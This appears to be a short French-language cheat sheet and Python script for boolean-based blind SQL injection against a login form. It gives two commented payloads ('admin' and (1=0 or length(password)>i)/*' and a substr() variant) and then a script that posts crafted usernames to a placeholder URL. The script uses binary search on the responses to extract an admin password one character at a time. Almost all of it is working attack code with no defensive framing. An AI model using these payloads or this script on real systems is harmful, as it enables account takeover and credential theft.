'''Trouver la longueur d'un mot de passe en blind en connaissant un compte admin:'''

#admin' and (1=0 or length(password)>i)/* -> faire varier i 
#la requête effectuée sera : select * from users where login='admin' and (1=0 or length(password)>i) -> 1=0 étant faux, l'utilisateur se connecte seulement si le 2ème condition est vérifiée

'''Trouver le ième caractère du champ souhaité:'''
#admin' and(1=0 or substr(password,i,1)='le_caractère')/*

import requests
 
url = 'lien_du_site'
length=8
commande="admin' and password{0}'{1}' --"
##
mdp=''
compteur=0
 
def inferieur_ou_superieur(indice, comparateur):
    ret=False
 
    commandeFinale = commande.format(comparateur, mdp + chr(indice) )
    payload = {'username': commandeFinale, 'password': 'sql injection boolean based'}
    r = requests.post(url, data=payload)
 
    res=r.text
    if 'Une partie de la réponse du header une fois authentifié' in res : #a modifier
        ret=True
    return ret
 
def dichoto(indice,debut,fin) :
    if inferieur_ou_superieur(indice, '<') :
        nouvelIndice=debut + int((indice-debut)/2)
        if nouvelIndice != indice :
            indice = dichoto(nouvelIndice,debut,indice)
    else :
        if inferieur_ou_superieur(indice, '>') :
            nouvelIndice=indice + int((fin-indice)/2)
            if nouvelIndice != indice :
                indice = dichoto(nouvelIndice,indice,fin)
   
    return indice
 
 
while compteur<length :
    indice=dichoto(125,0,255)
    mdp=mdp+chr(indice)
    print(mdp)
    compteur+=1
